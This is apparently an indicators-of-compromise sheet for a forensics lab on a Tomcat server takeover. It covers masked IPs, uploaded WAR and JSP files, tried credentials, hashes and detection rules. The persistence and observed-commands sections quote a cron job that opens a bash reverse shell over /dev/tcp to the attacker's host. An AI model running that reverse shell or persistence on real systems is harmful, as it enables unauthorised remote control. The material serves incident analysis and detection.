# English IOCs — Tomcat Takeover Lab

## IP addresses

| IOC | Role | Comment |
|---|---|---|
| `**********` | Victim | Compromised Tomcat server |
| `**********` | Attacker | Source of enumeration, WAR upload, and reverse shell |
| `**********` | Likely legitimate client | Normal browsing observed before the attack |

## Ports

| Port | Role |
|---|---|
| `****` | Exposed Apache Tomcat service |
| `**` | Initial reverse shell destination |
| `***` | Port used by cron persistence |
| `22` | SSH traffic observed after compromise |

## Web paths

```text
/
 /docs/
/examples/
/*******
/*******/
/*******/html
/*******/html/upload
/host-manager
/admin
/admin-console
/status
/webdav
/******/
```

## Files

| File | Role |
|---|---|
| `******.***` | Uploaded malicious WAR archive |
| `********.***` | Malicious JSP used for the reverse shell |
| `WEB-INF/web.xml` | WAR application configuration |
| `upload_raw.bin` | Raw data extracted from the upload POST request |
| `reverse_shell_stream_****.txt` | ASCII TCP stream of the reverse shell |
| `tomcat_takeover_findings.md` | Summary report |
| `hashes_sha256.txt` | SHA256 hashes of evidence files |

## Suspicious User-Agent

```text
************
```

## Observed credentials

Tested credentials:

```text
*****:*****
******:******
admin:
*****:******
******:******
*****:******
```

Valid credentials:

```text
*****:******
```

## Reverse shell

```text
tcp.stream == ****
**********:***** -> **********:80
```

## Persistence

```cron
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'
```

## Observed commands

```bash
whoami
cd /tmp
pwd
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'" > cron
crontab -i cron
crontab -l
```

## SHA256 hashes

```text
b0f9ed31b467a45f2ec77338b1b17fb455463423eb70593a4a64cb969c0de188  evidence/******.***
bc06cf70994c655b3f558c820c570e43b7dc52b990e11a10b6856d19b84c5e41  evidence/upload_raw.bin
88a7b5d5ebfbed35e86cddac74893685252c762bdc152942a57e0809e0e9bfad  evidence/reverse_shell_stream_****.txt
6838dd4e167551f7910d2ce6ef23aeaf4f325c897cd5f1d70ee00492d8ceb1c0  evidence/tomcat_takeover_findings.md
bc4900bad640e4937eb70575de02bea6541130e478d2c50d4cc4b2ca4dad4d22  evidence/extracted_war/********.***
3c309168f34178227b65c752ff563db78d769c7c389a6c822a97523d575584a3  evidence/extracted_war/WEB-INF/web.xml
```

## Possible detection logic

### HTTP detection

Look for:

```text
User-Agent contains ********
URI contains /*******
URI contains /*******/html/upload
URI contains /******/
POST request to /*******/html/upload
```

### Network detection

Look for:

```text
Outbound connection from a Tomcat server to an unexpected IP
Outbound connection to port 80 or 443 after a WAR upload
Interactive stream with frequent small packets
```

### Host detection

Look for:

```text
New WAR file deployed
Unknown JSP file created
Crontab modification
Bash command using /dev/tcp/
Runtime.getRuntime().exec inside a JSP
```
